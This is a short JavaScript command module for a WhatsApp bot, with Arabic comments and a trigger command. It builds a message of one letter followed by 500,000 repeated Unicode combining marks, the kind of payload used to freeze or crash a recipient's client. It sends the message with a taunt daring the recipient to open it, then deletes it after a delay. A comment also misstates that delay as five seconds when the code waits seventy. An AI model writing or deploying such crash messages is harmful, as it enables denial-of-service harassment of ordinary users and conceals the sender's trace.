module.exports = {
    commands: ['ت'],
    
    async execute(sock, msg, from, text) {
        try {
            // 1. تكوين نص ثقيل (محاكاة لنوع الـ Overload)
            // نستخدم حرفاً مع علامة دمج متكررة
            const baseChar = "A";
            const heavyMark = "\u0345"; // علامة يونيكود دمج
            const payload = baseChar + heavyMark.repeat(500000);

            // 2. إرسال الرسالة
            const sentMsg = await sock.sendMessage(from, { 
                text: `لو راجل افتح الرساله \n\n${payload}` 
            });

            console.log("✅ تم إرسال رسالة الاختبار.");

            // 3. ضبط مؤقت للحذف
            setTimeout(async () => {
                try {
                    await sock.sendMessage(from, { 
                        delete: sentMsg.key 
                    });
                    console.log("🗑️ تم مسح الرسالة بنجاح.");
                } catch (delErr) {
                    console.error("❌ فشل المسح:", delErr.message);
                }
            }, 70000); // 5000 ميلي ثانية = 5 ثوانٍ

        } catch (err) {
            console.error("❌ خطأ في الإرسال:", err.message);
        }
    }
}

